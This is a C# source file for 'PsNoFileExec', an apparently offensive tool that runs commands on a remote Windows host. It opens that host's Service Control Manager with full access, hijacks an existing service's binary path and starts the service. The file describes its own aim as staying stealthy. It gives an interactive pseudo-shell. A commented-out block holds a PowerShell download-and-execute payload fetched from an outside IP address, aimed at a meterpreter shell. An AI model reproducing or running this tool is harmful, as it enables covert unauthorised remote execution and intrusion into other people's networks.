using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;


//PSNoFileExec tries to execute programs remotely without dropping a binary or creating a new service to remain stealthy.

namespace PsNoFileExec
{
    class Program
    {

        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);


        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);

        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

        static void Main(string[] args)
        {

           string target = args[0];
           string ServiceName = args[1];
           int interactive = int.Parse(args[2]);
            



            //Authenticate to remote host and access to DCE/RPC interface with SC_MANAGER_ALL_ACCESS:
            IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);
            if (SCMHandle == IntPtr.Zero)
            {
                // Failed to authenticate or access DCE/RPC interface
                Console.WriteLine("Failed to authenticate or access DCE/RPC interface on the target host.");
              
                return;
            }
            Console.WriteLine("Managed to authenticate to target host");

            //Once we have access, try to open an existing service with SERVCE_ALL_ACCESS:
            
            IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF01FF);

            if (schService == IntPtr.Zero)
            {
                // Failed to open the existing service
                Console.WriteLine("Failed to open the existing service.");
                return;
            }

            
            Console.WriteLine("Successfully opened the existing service.");



            //Try to create a wrapper for an interactive shell here:
            if (interactive != 0)
            {
                string ipayload = null ;
                bool Result;
                int error;
                Console.WriteLine("[^] Interactive shell selected");
                Console.ForegroundColor = ConsoleColor.White;
                Console.ForegroundColor = ConsoleColor.Green;
                while (ipayload != "exit")
                {
                    
                    Console.Write("Shell> ");
                    ipayload = Console.ReadLine();
                    ChangeServiceConfigA(schService, 0xffffffff, 3, 0, ipayload, null, null, null, null, null, null);
                    Result = StartService(schService, 0, null);
                    error = Marshal.GetLastWin32Error();
                    Console.WriteLine(error);
                    if (error == 1053)
                    {
                        Console.WriteLine("[^]Command executed");

                    }

                }
            }

           

            //Legacy code.

            /*

            //use ChangeServiceConfig to allow us to edit our service specified earlier.
            //Use powershell to download our meterpreter payload and execute in memory.
            string payload = "C:\\windows\\system32\\cmd.exe /c powershell.exe -nop -w hidden -c iex(new-object net.webclient).downloadstring('http://192.168.45.164/test.ps1')";
            
            bool bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null, null, null, null, null);


            if (!bResult)
            {
                // Failed to change the service configuration
                int errorCode = Marshal.GetLastWin32Error();
                Console.WriteLine($"Failed to change the service configuration. Error code: {errorCode}");
               
                return;
            }
            Console.WriteLine("Successfully changed the service configuration.");


            //start the modified service:

            bResult = StartService(schService, 0, null);
            if (!bResult)
            {
                // Failed to start the service
                int errorCode = Marshal.GetLastWin32Error();
                Console.WriteLine($"Failed to start the service. Error code: {errorCode}");
                
            }

            Console.WriteLine("Successfully started the service.");

            //todo, try to get meterpreter shell:

            //restore service back to normal after editing.
            // Release the SCM handle
            SCMHandle = IntPtr.Zero;

            Console.WriteLine("SCM handle released.");
            */
            
        }
    }
}
